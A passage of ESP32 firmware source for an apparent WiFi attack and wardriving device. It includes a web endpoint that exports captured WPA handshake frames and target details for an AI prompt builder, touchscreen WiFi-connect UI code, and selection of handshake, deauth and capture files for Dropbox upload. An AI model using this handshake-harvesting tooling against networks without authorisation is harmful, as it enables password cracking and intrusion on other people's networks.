  // do vendor lookups and build a TargetProfile without needing any extra data.
  webServer.on("/api/ai/frames", HTTP_GET, [](){
    JsonDocument doc;
    doc["ok"]      = true;
    doc["running"] = YoinkEngine::isRunning();
    doc["state"]   = YoinkEngine::getStateStr();

    // Current attack target (quick reference for the AI prompt builder)
    const uint8_t* tgtBssid = YoinkEngine::getTargetBSSID();
    const char*    tgtSsid  = YoinkEngine::getTargetSSID();
    if (tgtSsid && tgtSsid[0]) {
      JsonObject tgt = doc["target"].to<JsonObject>();
      tgt["ssid"] = tgtSsid;
      tgt["rssi"] = YoinkEngine::getTargetRSSI();
      tgt["auth"] = YoinkEngine::getTargetAuthStr();
      char bssidStr[18];
      snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               tgtBssid[0], tgtBssid[1], tgtBssid[2],
               tgtBssid[3], tgtBssid[4], tgtBssid[5]);
      tgt["bssid"] = bssidStr;
      // OUI prefix — Android looks this up in the IEEE MA-L database
      char ouiStr[9];
      snprintf(ouiStr, sizeof(ouiStr), "%02X:%02X:%02X",
               tgtBssid[0], tgtBssid[1], tgtBssid[2]);
      tgt["oui"] = ouiStr;
    }

    // All captured handshakes with per-frame EAPOL hex
    JsonArray hsArr = doc["handshakes"].to<JsonArray>();
    for (uint8_t i = 0; i < YoinkEngine::getTotalHandshakeSlots(); i++) {
      const YoinkHandshake* hs = YoinkEngine::getHandshake(i);
      if (!hs || hs->capturedMask == 0) continue;

      JsonObject ho = hsArr.add<JsonObject>();
      ho["ssid"]  = hs->ssid;
      ho["mask"]  = hs->capturedMask;
      ho["valid"] = hs->hasValidPair();
      ho["saved"] = hs->saved;

      char bStr[18], stStr[18];
      snprintf(bStr,  sizeof(bStr),  "%02X:%02X:%02X:%02X:%02X:%02X",
               hs->bssid[0],   hs->bssid[1],   hs->bssid[2],
               hs->bssid[3],   hs->bssid[4],   hs->bssid[5]);
      snprintf(stStr, sizeof(stStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               hs->station[0], hs->station[1], hs->station[2],
               hs->station[3], hs->station[4], hs->station[5]);
      ho["bssid"]   = bStr;
      ho["station"] = stStr;

      // OUI prefixes — first 3 bytes; Android resolves vendor from bundled IEEE CSV
      char apOui[9], staOui[9];
      snprintf(apOui,  sizeof(apOui),  "%02X:%02X:%02X",
               hs->bssid[0],   hs->bssid[1],   hs->bssid[2]);
      snprintf(staOui, sizeof(staOui), "%02X:%02X:%02X",
               hs->station[0], hs->station[1], hs->station[2]);
      ho["ap_oui"]  = apOui;
      ho["sta_oui"] = staOui;

      // Per-message EAPOL frames (M1-M4), hex-encoded
      JsonArray frArr = ho["frames"].to<JsonArray>();
      for (uint8_t m = 0; m < 4; m++) {
        if (!(hs->capturedMask & (1u << m))) continue;
        const YoinkEapolFrame& ef = hs->frames[m];
        if (ef.eapolLen == 0) continue;

        JsonObject fr = frArr.add<JsonObject>();
        fr["msg"]  = (int)(m + 1);
        fr["rssi"] = ef.rssi;
        fr["ts"]   = ef.timestamp;

        // EAPOL payload hex (cipher suite, MIC, nonce, replay counter all here)
        String eapolHex;
        eapolHex.reserve(ef.eapolLen * 2);
        for (uint16_t b = 0; b < ef.eapolLen; b++) {
          char nb[3];
          snprintf(nb, sizeof(nb), "%02X", ef.eapolData[b]);
          eapolHex += nb;
        }
        fr["eapol_hex"] = eapolHex;

        // Full 802.11 frame hex (includes addr1/2/3 for OUI cross-check)
        if (ef.fullFrameLen > 0) {
          String frameHex;
          frameHex.reserve(ef.fullFrameLen * 2);
          for (uint16_t b = 0; b < ef.fullFrameLen; b++) {
            char nb[3];
            snprintf(nb, sizeof(nb), "%02X", ef.fullFrame[b]);
            frameHex += nb;
          }
          fr["frame_hex"] = frameHex;
        }
      }
    }

    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.begin();
  Serial.printf("[web] WebServer started on port %d\n", webServerPort);
  wifiConnectStatus = "WebServer active: port " + String(webServerPort);
  pushConsoleEventf("INFO", "WEB", "Webserver started on %u", webServerPort);
}

static void stopWebServer() {
  if (!webServerRunning) {
    Serial.println("[web] WebServer already stopped");
    return;
  }
  Serial.println("[web] Stopping WebServer");
  webServer.stop();
  webServerRunning = false;
  wifiConnectStatus = "WebServer stopped";
  Serial.println("[web] WebServer stopped");
  pushConsoleEvent("INFO", "WEB", "Webserver stopped");
}

static inline int wifiConnectStatusLineY() {
  if (wifiConnectStatusY > 0) return wifiConnectStatusY;
  return tft.height() - 48;
}

static void drawWifiPasswordModal() {
  if (!wifiConnectShowPasswordModal) return;
  const int w = tft.width();
  const int h = tft.height();
#if defined(NEONDRIVE_TARGET_CYD24)
  const bool cyd24Layout = true;
#else
  const bool cyd24Layout = false;
#endif
  const bool portrait = (h > w);
  const bool tab5Large = (w >= 900 || h >= 900);
  const bool compact = cyd24Layout ? true : !tab5Large;
  const int pad = cyd24Layout ? max(4, g_ui->safe_margin) : (compact ? 6 : 14);
  const int x0 = pad;
  const int y0 = cyd24Layout ? (uiHeaderBandH() + 2) : (compact ? (uiHeaderBandH() + 4) : (uiHeaderBandH() + 8));
  const int ww = w - (pad * 2);
  const UiRect bottom = computeBottomBarRect();
  const int safeBottom = cyd24Layout ? (bottom.y - 2) : (h - pad);
  const int hh = safeBottom - y0;
  const int panelR = cyd24Layout ? 5 : (compact ? 6 : 12);
  const int keyGap = cyd24Layout ? 2 : (compact ? 3 : 8);
  int keyH = compact ? (portrait ? 22 : 20) : (portrait ? 58 : 56);
  int actionH = compact ? (portrait ? 24 : 22) : (portrait ? 58 : 52);

  const char* alphaRow1 = "1234567890-=";
  const char* alphaRow2 = "qwertyuiop[]";
  const char* alphaRow3 = "asdfghjkl;'";
  const char* alphaRow4 = "zxcvbnm,./";
  const char* symRow1 = "!@#$%^&*()_+";
  const char* symRow2 = "`~|{}<>?:\\";
  const char* symRow3 = "1234567890[]";
  const char* symRow4 = "-=,./;'";
  const char* row1 = wifiPwSymbols ? symRow1 : alphaRow1;
  const char* row2 = wifiPwSymbols ? symRow2 : alphaRow2;
  const char* row3 = wifiPwSymbols ? symRow3 : alphaRow3;
  const char* row4 = wifiPwSymbols ? symRow4 : alphaRow4;

  // Network panel
  const int netH = cyd24Layout ? 38 : (compact ? 66 : (portrait ? 188 : 124));
  tft.fillRoundRect(x0, y0, ww, netH, panelR, TFT_BLACK);
  tft.drawRoundRect(x0, y0, ww, netH, panelR, TFT_MAGENTA);
  applyFontSm();
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("SELECTED NETWORK", x0 + (compact ? 6 : 14), y0 + (compact ? 5 : 10));
  String ssid = "(none)";
  if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) {
    ssid = aps[wifiConnectSelectedIdx].ssid.isEmpty() ? String("(hidden)") : aps[wifiConnectSelectedIdx].ssid;
  }
  if (!compact) applyFontMd();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  const int ssidY = y0 + (cyd24Layout ? 15 : (compact ? 22 : 42));
  drawTextClipped(ssid, x0 + (compact ? 6 : 14), ssidY, ww - (compact ? 12 : 24), TFT_CYAN, TFT_BLACK, true);
  applyFontSm();
  if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) {
    const ApRecord& a = aps[wifiConnectSelectedIdx];
    const int infoY = y0 + (cyd24Layout ? 26 : (compact ? 40 : 82));
    if (cyd24Layout) {
      drawTextClipped(String(authToStr(a.auth)) + "  " + String(a.rssi) + "dBm", x0 + 6, infoY, ww - 12, TFT_GREEN, TFT_BLACK, false);
    } else {
      drawTextClipped(authToStr(a.auth), x0 + (compact ? 6 : 14), infoY, ww / 3, TFT_GREEN, TFT_BLACK, false);
      drawTextClipped(String(a.rssi) + " dBm", x0 + ww / 3, infoY, ww / 3, TFT_GREEN, TFT_BLACK, false);
      drawTextClipped("BSSID " + a.bssid, x0 + (2 * ww / 3), infoY, (ww / 3) - 8, TFT_LIGHTGREY, TFT_BLACK, false);
    }
  }

  // Password panel
  const int pwY = y0 + netH + keyGap;
  const int pwH = cyd24Layout ? 24 : (compact ? 42 : 84);
  tft.fillRoundRect(x0, pwY, ww, pwH, panelR, TFT_BLACK);
  tft.drawRoundRect(x0, pwY, ww, pwH, panelR, 0x781F);
  tft.setTextColor(0xD81F, TFT_BLACK);
  tft.drawString("PASSWORD", x0 + (compact ? 6 : 14), pwY + (cyd24Layout ? 3 : (compact ? 4 : 10)));
  String shown = wifiConnectPassword;
  if (!wifiConnectRevealPassword) {
    String masked;
    for (size_t i = 0; i < shown.length(); i++) masked += '*';
    shown = masked;
  }
  if (shown.isEmpty()) shown = "(empty)";
  const int shownY = pwY + (cyd24Layout ? 12 : (compact ? 20 : 40));
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  drawTextClipped(shown, x0 + (compact ? 6 : 14), shownY,
                  ww - (cyd24Layout ? 62 : (compact ? 52 : 110)), TFT_CYAN, TFT_BLACK, false);
  btnWifiPwShowHide = {x0 + ww - (cyd24Layout ? 54 : (compact ? 44 : 96)),
                       pwY + (cyd24Layout ? 2 : (compact ? 14 : 22)),
                       cyd24Layout ? 50 : (compact ? 38 : 82),
                       cyd24Layout ? 20 : (compact ? 22 : 48),
                       wifiConnectRevealPassword ? "Hide" : "Show"};
  drawButton(btnWifiPwShowHide, TFT_NAVY, TFT_CYAN, TFT_WHITE);

  if (cyd24Layout) {
    const int rowsAreaTop = pwY + pwH + keyGap;
    const int rowsAreaH = max(72, safeBottom - rowsAreaTop);
    actionH = clampi(g_ui->btn_h - 2, 16, 20);
    keyH = clampi((rowsAreaH - actionH - (4 * keyGap)) / 4, 14, 18);
  }

  // Keyboard rows
  wifiPwKeyCount = 0;
  auto addKey = [&](int x, int y, int kw, char baseChar) {
    if (wifiPwKeyCount >= 40) return;
    char outChar = baseChar;
    if (isalpha((unsigned char)baseChar) && !wifiPwSymbols) {
      outChar = wifiPwShift ? (char)toupper(baseChar) : (char)tolower(baseChar);
    }
    wifiPwKeyValues[wifiPwKeyCount] = outChar;
    wifiPwKeyLabels[wifiPwKeyCount][0] = outChar;
    wifiPwKeyLabels[wifiPwKeyCount][1] = '\0';
    btnWifiPwKeys[wifiPwKeyCount] = {x, y, kw, keyH, wifiPwKeyLabels[wifiPwKeyCount]};
    drawButton(btnWifiPwKeys[wifiPwKeyCount], TFT_BLACK, TFT_MAGENTA, TFT_CYAN);
    wifiPwKeyCount++;
  };
  auto drawRow = [&](const char* keys, int y, bool cyanRow) {
    const int n = (int)strlen(keys);
    const int kw = max(14, (ww - ((n - 1) * keyGap)) / n);
    int x = x0;
    for (int i = 0; i < n; i++) {
      addKey(x, y, kw, keys[i]);
      if (cyanRow) drawButton(btnWifiPwKeys[wifiPwKeyCount - 1], TFT_BLACK, TFT_CYAN, TFT_CYAN);
      x += kw + keyGap;
    }
  };

  const int kY0 = pwY + pwH + keyGap;
  drawRow(row1, kY0, false);
  drawRow(row2, kY0 + keyH + keyGap, true);

  // Row 3 with tab + row text + backspace
  int r3y = kY0 + ((keyH + keyGap) * 2);
  btnWifiPwMode = {x0, r3y, compact ? 40 : 92, keyH, wifiPwSymbols ? "ABC" : "SYM"};
  drawButton(btnWifiPwMode, 0x7A40, TFT_YELLOW, TFT_YELLOW);
  int row3x = btnWifiPwMode.x + btnWifiPwMode.w + keyGap;
  int row3n = (int)strlen(row3);
  int row3kw = max(cyd24Layout ? 11 : 12,
                   (ww - btnWifiPwMode.w - (cyd24Layout ? 56 : (compact ? 56 : 118)) - ((row3n + 1) * keyGap)) / row3n);
  for (int i = 0; i < row3n; i++) {
    addKey(row3x + i * (row3kw + keyGap), r3y, row3kw, row3[i]);
    drawButton(btnWifiPwKeys[wifiPwKeyCount - 1], TFT_BLACK, TFT_CYAN, TFT_CYAN);
  }
  btnWifiPwBack = {x0 + ww - (cyd24Layout ? 54 : (compact ? 52 : 108)), r3y,
                   cyd24Layout ? 54 : (compact ? 52 : 108), keyH, "Backsp"};
  drawButton(btnWifiPwBack, TFT_BLACK, TFT_MAGENTA, TFT_MAGENTA);

  // Row 4 with shift + letters + space
  int r4y = r3y + keyH + keyGap;
  const int shiftW = cyd24Layout ? 46 : (compact ? 48 : 108);
  btnWifiPwShift = {x0, r4y, shiftW, keyH, wifiPwShift ? "SHIFT" : "Shift"};
  drawButton(btnWifiPwShift, wifiPwShift ? TFT_NAVY : TFT_BLACK, TFT_CYAN, TFT_CYAN);
  int row4n = (int)strlen(row4);
  int avail = ww - shiftW - keyGap - (cyd24Layout ? 72 : (compact ? 90 : 180)) - (row4n * keyGap);
  int row4kw = max(cyd24Layout ? 11 : 12, avail / max(1, row4n));
  int row4x = x0 + shiftW + keyGap;
  for (int i = 0; i < row4n; i++) {
    addKey(row4x + i * (row4kw + keyGap), r4y, row4kw, row4[i]);
    drawButton(btnWifiPwKeys[wifiPwKeyCount - 1], TFT_BLACK, TFT_CYAN, TFT_CYAN);
  }
  btnWifiPwSpace = {x0 + ww - (cyd24Layout ? 72 : (compact ? 84 : 168)), r4y,
                    cyd24Layout ? 72 : (compact ? 84 : 168), keyH, "Space"};
  drawButton(btnWifiPwSpace, TFT_BLACK, TFT_CYAN, TFT_CYAN);

  // Action row
  int r5y = r4y + keyH + keyGap;
  const int actGap = keyGap;
  const int actCount = 5;
  const int actW = max(cyd24Layout ? 40 : 44, (ww - (actGap * (actCount - 1))) / actCount);
  btnWifiPwSaved = {x0 + (actW + actGap) * 0, r5y, actW, actionH, "Saved"};
  btnWifiPwClear = {x0 + (actW + actGap) * 1, r5y, actW, actionH, "Clear"};
  btnWifiPwCancel = {x0 + (actW + actGap) * 2, r5y, actW, actionH, "Cancel"};
  btnWifiPwConnect = {x0 + (actW + actGap) * 3, r5y, actW, actionH, "Connect"};
  btnWifiPwReconnect = {x0 + (actW + actGap) * 4, r5y, actW, actionH, "Reconnect"};
  drawButton(btnWifiPwSaved, TFT_NAVY, TFT_CYAN, TFT_WHITE);
  drawButton(btnWifiPwClear, TFT_BLACK, TFT_CYAN, TFT_CYAN);
  drawButton(btnWifiPwCancel, TFT_BLACK, TFT_RED, TFT_RED);
  drawButton(btnWifiPwConnect, TFT_DARKGREEN, TFT_GREEN, TFT_GREEN);
  drawButton(btnWifiPwReconnect, TFT_BLACK, TFT_YELLOW, TFT_YELLOW);

  if (wifiConnectShowSavedDrawer) {
    const int dw = compact ? (ww - 8) : min(ww - 18, (portrait ? ww - 18 : ww / 2));
    const int dx = compact ? (x0 + 4) : (x0 + ww - dw - 8);
    const int dy = pwY + 2;
    const int dh = max(80, (r5y + actionH) - dy - 4);
    tft.fillRoundRect(dx, dy, dw, dh, panelR, TFT_BLACK);
    tft.drawRoundRect(dx, dy, dw, dh, panelR, TFT_MAGENTA);
    tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    tft.drawString("SAVED NETWORKS", dx + 6, dy + 6);
    btnWifiSavedClose = {dx + dw - (compact ? 36 : 60), dy + 4, compact ? 32 : 54, compact ? 18 : 24, "X"};
    drawButton(btnWifiSavedClose, TFT_MAROON, TFT_MAGENTA, TFT_WHITE);
    for (int i = 0; i < AppConfig::MAX_SAVED_WIFI; i++) btnWifiSavedRows[i] = {0,0,0,0,""};
    int rowY = dy + (compact ? 24 : 34);
    const int rowH = compact ? 18 : 30;
    for (int i = 0; i < cfg.wifi_savedCount && i < AppConfig::MAX_SAVED_WIFI; i++) {
      if (rowY + rowH > dy + dh - 4) break;
      String lbl = cfg.wifi_savedSsid[i].isEmpty() ? String("(empty)") : cfg.wifi_savedSsid[i];
      btnWifiSavedRows[i] = {dx + 6, rowY, dw - 12, rowH, ""};
      tft.drawRect(btnWifiSavedRows[i].x, btnWifiSavedRows[i].y, btnWifiSavedRows[i].w, btnWifiSavedRows[i].h, TFT_CYAN);
      drawTextClipped(lbl, btnWifiSavedRows[i].x + 4, rowY + (compact ? 3 : 7), btnWifiSavedRows[i].w - 8, TFT_CYAN, TFT_BLACK, false);
      rowY += rowH + 4;
    }
  } else {
    btnWifiSavedClose = {0,0,0,0,""};
    for (int i = 0; i < AppConfig::MAX_SAVED_WIFI; i++) btnWifiSavedRows[i] = {0,0,0,0,""};
  }
}

static void drawWifiConnect() {
#if defined(NEONDRIVE_TARGET_M5CARDPUTER)
  {
  tft.fillScreen(TFT_BLACK);
  drawUniversalBackground();
  drawHeader("WiFi Connect");

  const int w = tft.width();
  const int h = tft.height();
  const int lm = g_ui->safe_margin;
  const int topY = g_ui->top_gap + g_ui->header_h + 1;
  const int bottomY = h - g_ui->bottom_bar_h;
  const int gap = 3;

  int idx = wifiConnectSelectedIdx;
  if (idx < 0 || idx >= apCount) idx = apSelected;
  const bool haveAp = (idx >= 0 && idx < apCount);
  const ApRecord* ap = haveAp ? &aps[idx] : nullptr;
  if (haveAp) {
    wifiConnectSelectedIdx = idx;
    wifiConnectSsid = ap->ssid.isEmpty() ? "(hidden)" : ap->ssid;
    wifiConnectNeedsPassword = (ap->auth != WIFI_AUTH_OPEN);
  }

  const int apH = 40;
  tft.fillRoundRect(lm, topY, w - (lm * 2), apH, 4, TFT_BLACK);
  tft.drawRoundRect(lm, topY, w - (lm * 2), apH, 4, TFT_MAGENTA);
  applyFontSm();
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("SELECTED AP", lm + 4, topY + 3);
  applyFontMd();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  drawTextClipped(haveAp ? wifiConnectSsid : String("(none selected)"),
                  lm + 4, topY + 14, w - (lm * 2) - 8, TFT_CYAN, TFT_BLACK, true);
  applyFontSm();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  if (haveAp) {
    String m = "CH" + String(ap->channel) + "  " + String(ap->rssi) + "dBm  " + authToStr(ap->auth);
    drawTextClipped(m, lm + 4, topY + 28, w - (lm * 2) - 8, TFT_GREEN, TFT_BLACK, false);
  } else {
    tft.drawString("Pick a network in WiFi Scan first", lm + 4, topY + 28);
  }

  const int pwY = topY + apH + gap;
  const int pwH = 30;
  tft.fillRoundRect(lm, pwY, w - (lm * 2), pwH, 4, TFT_BLACK);
  tft.drawRoundRect(lm, pwY, w - (lm * 2), pwH, 4, TFT_CYAN);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("PASSWORD", lm + 4, pwY + 3);
  String shown = wifiConnectPassword;
  if (shown.isEmpty()) shown = "(empty)";
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  drawTextClipped(shown, lm + 4, pwY + 15, w - (lm * 2) - 8, TFT_WHITE, TFT_BLACK, false);

  const int infoY = pwY + pwH + gap;
  const int infoH = bottomY - infoY - 1;
  tft.fillRoundRect(lm, infoY, w - (lm * 2), infoH, 4, TFT_BLACK);
  tft.drawRoundRect(lm, infoY, w - (lm * 2), infoH, 4, TFT_DARKGREY);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("ENTER connect  DEL/BACK leave", lm + 4, infoY + 3);
  tft.drawString("TAB screenshot  X clear  R reconnect", lm + 4, infoY + 13);
  tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
  if (haveAp) {
    drawTextClipped("BSSID: " + ap->bssid, lm + 4, infoY + 23, w - (lm * 2) - 8, TFT_LIGHTGREY, TFT_BLACK, false);
  }

  tft.fillRect(0, bottomY, w, h - bottomY, TFT_BLACK);
  const int wifiStatus = WiFi.status();
  if (wifiStatus == WL_CONNECTED) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    drawTextClipped("Connected: " + WiFi.SSID() + "  " + WiFi.localIP().toString(),
                    lm, bottomY + 4, w - (lm * 2), TFT_GREEN, TFT_BLACK, false);
  } else if (wifiConnectInProgress) {
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    drawTextClipped("Status: Connecting...", lm, bottomY + 4, w - (lm * 2), TFT_YELLOW, TFT_BLACK, false);
  } else {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    drawTextClipped("Status: " + wifiConnectStatus, lm, bottomY + 4, w - (lm * 2), TFT_CYAN, TFT_BLACK, false);
  }

  btnWifiConnectBack = {0, 0, 0, 0, ""};
  btnWifiConnectScan = {0, 0, 0, 0, ""};
  btnWifiConnectSubmit = {0, 0, 0, 0, ""};
  btnWifiConnectDisconnect = {0, 0, 0, 0, ""};
  btnWifiConnectUp = {0, 0, 0, 0, ""};
  btnWifiConnectDown = {0, 0, 0, 0, ""};
  for (int i = 0; i < WIFI_CONNECT_VISIBLE_ROWS; i++) btnWifiConnectList[i] = {0, 0, 0, 0};
  drawBorder();
  return;
  }
#endif

  tft.fillScreen(TFT_BLACK);
  drawHeader("WiFi Connect");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const bool tab5Large = (w >= 900 || h >= 600);
  const int wifiStatus = WiFi.status();

  int btnGap = 6;
  int btnH = 30;
  int btnY = h - 36;
  int btnX0 = 8;
  int controlsW = max(236, uiRightLimitForBand(btnY, btnH) - 8);
  bool hideBottomConnect = false;
  int bottomBtnCount = 4;
  int btnW = max(48, (controlsW - (btnGap * (bottomBtnCount - 1))) / bottomBtnCount);
  int selectedY = 24;
  int statusY = 36;
  int hintY = 48;
  int statusLineY = btnY - 14;
  int listTopY = 62;
  int listBottomY = statusLineY - 4;
  int rowH = max(18, (listBottomY - listTopY) / WIFI_CONNECT_VISIBLE_ROWS);

#if defined(NEONDRIVE_TARGET_CYD)
  // CYD hard-locked geometry for the WiFi Connect screen.
  btnGap = 6;
  btnH = 30;
  btnY = h - 36;
  controlsW = max(236, uiRightLimitForBand(btnY, btnH) - 8);
  hideBottomConnect = false;
  bottomBtnCount = 4;
  btnW = (controlsW - (btnGap * 3)) / 4;
  selectedY = 24;
  statusY = 36;
  hintY = 48;
  statusLineY = btnY - 14;
  listTopY = 62;
  listBottomY = statusLineY - 4;
  rowH = max(18, (listBottomY - listTopY) / WIFI_CONNECT_VISIBLE_ROWS);
#else
  btnGap = compact ? 4 : 6;
  btnH = tab5Large ? 40 : (compact ? 24 : 30);
  btnY = h - (compact ? 30 : 36);
  controlsW = max(compact ? 208 : 236, uiRightLimitForBand(btnY, btnH) - 8);
  hideBottomConnect = tab5Large;
  bottomBtnCount = hideBottomConnect ? 3 : 4;
  btnW = max(48, (controlsW - (btnGap * (bottomBtnCount - 1))) / bottomBtnCount);
  selectedY = compact ? (uiHeaderBandH() + 2) : 24;
  statusY = selectedY + 12;
  hintY = statusY + 12;
  statusLineY = btnY - 14;
  listTopY = hintY + 14;
  listBottomY = statusLineY - 4;
  rowH = clampi((listBottomY - listTopY) / WIFI_CONNECT_VISIBLE_ROWS, compact ? 16 : 20, compact ? 24 : 30);
  if ((rowH * WIFI_CONNECT_VISIBLE_ROWS) > (listBottomY - listTopY)) {
    rowH = max(14, (listBottomY - listTopY) / WIFI_CONNECT_VISIBLE_ROWS);
  }
#endif
  wifiConnectStatusY = statusLineY;

  btnWifiConnectBack = {btnX0 + (btnW + btnGap) * 0, btnY, btnW, btnH, "Back"};
  btnWifiConnectScan = {btnX0 + (btnW + btnGap) * 1, btnY, btnW, btnH, "Scan"};
  if (hideBottomConnect) {
    btnWifiConnectSubmit = {0, 0, 0, 0, ""};
    btnWifiConnectDisconnect = {btnX0 + (btnW + btnGap) * 2, btnY, btnW, btnH, "Disc"};
  } else {
    btnWifiConnectSubmit = {btnX0 + (btnW + btnGap) * 2, btnY, btnW, btnH, "Connect"};
    btnWifiConnectDisconnect = {btnX0 + (btnW + btnGap) * 3, btnY, btnW, btnH, "Disc"};
  }

  const int scrollBtn = clampi(ActionDockBoxW, compact ? 18 : 22, compact ? 24 : 30);
  int scrollTopY = uiActionDockSafeBottom() + 3;
  const int scrollGap = 6;
  if (scrollTopY + (scrollBtn * 2) + scrollGap > btnY - 6) {
    scrollTopY = btnY - 6 - ((scrollBtn * 2) + scrollGap);
  }
  const int scrollX = ActionDockBoxX + ((ActionDockBoxW - scrollBtn) / 2);
  btnWifiConnectUp = {scrollX, scrollTopY, scrollBtn, scrollBtn, "^"};
  btnWifiConnectDown = {scrollX, scrollTopY + scrollBtn + scrollGap, scrollBtn, scrollBtn, "v"};

  drawButton(btnWifiConnectBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnectScan, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);
  if (!hideBottomConnect) {
    drawButton(btnWifiConnectSubmit, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);
  }
  drawButton(btnWifiConnectDisconnect, wifiStatus == WL_CONNECTED ? TFT_MAROON : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnectUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnectDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  const int listX = 8;

  const int listRight = uiRightLimitForBand(listTopY, rowH - 2);
  const int listW = max(120, listRight - listX);

  auto trimToWidth = [&](String s, int maxW) -> String {
    bool trimmed = false;
    while (s.length() > 4 && tft.textWidth(s) > maxW) {
      s.remove(s.length() - 1);
      trimmed = true;
    }
    if (trimmed && s.length() > 3) s += "...";
    while (s.length() > 4 && tft.textWidth(s) > maxW) {
      s.remove(s.length() - 1);
    }
    return s;
  };

  if (!wifiConnectShowPasswordModal) {
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    String selectedLine = "Selected: (none)";
    if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) {
      const ApRecord& a = aps[wifiConnectSelectedIdx];
      selectedLine = "Selected: " + (a.ssid.isEmpty() ? String("(hidden)") : a.ssid) +
                     " | CH " + String(a.channel) + " | " + String(a.rssi) + "dBm";
    }
    selectedLine = trimToWidth(selectedLine, uiRightLimitForBand(selectedY, 14) - 8);
    tft.drawString(selectedLine, listX, selectedY);

    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    if (wifiConnectScanActive) tft.drawString("Scanning...", listX, statusY);
    else tft.drawString("APs: " + String(apCount), listX, statusY);

    if (wifiConnectScanActive) tft.drawString("Please wait...", listX, hintY);
    else tft.drawString("Tap row to select network", listX, hintY);

    for (int r = 0; r < WIFI_CONNECT_VISIBLE_ROWS; r++) {
      const int idx = wifiConnectScroll + r;
      const int y = listTopY + (r * rowH);
      const bool sel = (idx == wifiConnectSelectedIdx);
      btnWifiConnectList[r] = {listX, y, listW, rowH - 2};

      if (idx < apCount) {
        const ApRecord& a = aps[idx];
        const uint16_t bgColor = sel ? TFT_DARKGREEN : TFT_BLACK;
        const uint16_t borderColor = sel ? TFT_MAGENTA : TFT_DARKGREY;
        tft.fillRect(listX, y, listW, rowH - 2, bgColor);
        tft.drawRect(listX, y, listW, rowH - 2, borderColor);

        tft.setTextColor(sel ? TFT_WHITE : TFT_CYAN, bgColor);
        const int textY = y + ((rowH <= 18) ? 4 : ((rowH - 10) / 2));
        String rowText = (a.ssid.isEmpty() ? String("(hidden)") : a.ssid) +
                         " | CH" + String(a.channel) + " | " + authToStr(a.auth) +
                         " | " + String(a.rssi) + "dBm";
        rowText = trimToWidth(rowText, listW - 6);
        tft.drawString(rowText, listX + 2, textY);
      } else {
        tft.fillRect(listX, y, listW, rowH - 2, TFT_BLACK);
        tft.drawRect(listX, y, listW, rowH - 2, TFT_DARKGREY);
      }
    }
    tft.fillRect(0, statusLineY - 2, w, 16, TFT_BLACK);
    if (wifiStatus == WL_CONNECTED) {
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("Status: Connected  " + WiFi.localIP().toString(), listX, statusLineY);
    } else if (wifiConnectInProgress) {
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.drawString("Status: Connecting...", listX, statusLineY);
    } else {
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.drawString("Status: " + wifiConnectStatus, listX, statusLineY);
    }
  } else {
    for (int i = 0; i < WIFI_CONNECT_VISIBLE_ROWS; i++) {
      btnWifiConnectList[i] = {0, 0, 0, 0};
    }
    drawWifiPasswordModal();
  }

  drawBorder();
}

// ── Dropbox: upload all capture-relevant files from SD ────────────────────────

// True if a root-level filename matches a NEONDRIVE-generated file pattern.
static bool isNeondriveRootFile(const char* name) {
  // Exact matches
  if (strcasecmp(name, "recon_scan.csv")   == 0) return true;
  if (strcasecmp(name, "yoink_session.log") == 0) return true;

  const char* ext = strrchr(name, '.');
  if (!ext) return false;

  // .22000 handshake files anywhere at root
  if (strcasecmp(ext, ".22000") == 0) return true;

  // Prefix + .log patterns
  if (strcasecmp(ext, ".log") == 0) {
    if (strncasecmp(name, "wardrive_",         9)  == 0) return true;
    if (strncasecmp(name, "station_wardrive_", 17) == 0) return true;
    return false;
  }

  // Prefix + .pcap patterns
  if (strcasecmp(ext, ".pcap") == 0) {
    if (strncasecmp(name, "raw_",    4) == 0) return true;
    if (strncasecmp(name, "beacon_", 7) == 0) return true;
    if (strncasecmp(name, "probe_",  6) == 0) return true;
    if (strncasecmp(name, "ap_sta_", 7) == 0) return true;
    if (strncasecmp(name, "ap_",     3) == 0) return true;
    if (strncasecmp(name, "deauth_", 7) == 0) return true;
    return false;
  }

  return false;
}

static void syncAllDropbox() {
  if (cfg.dropbox_token.isEmpty()) { strncpy(syncDropboxStatus, "No token", sizeof(syncDropboxStatus)-1); return; }
  if (!sdReady && !mountSdCard(false)) { strncpy(syncDropboxStatus, "No SD", sizeof(syncDropboxStatus)-1); return; }

  strncpy(syncDropboxStatus, "Syncing...", sizeof(syncDropboxStatus) - 1);

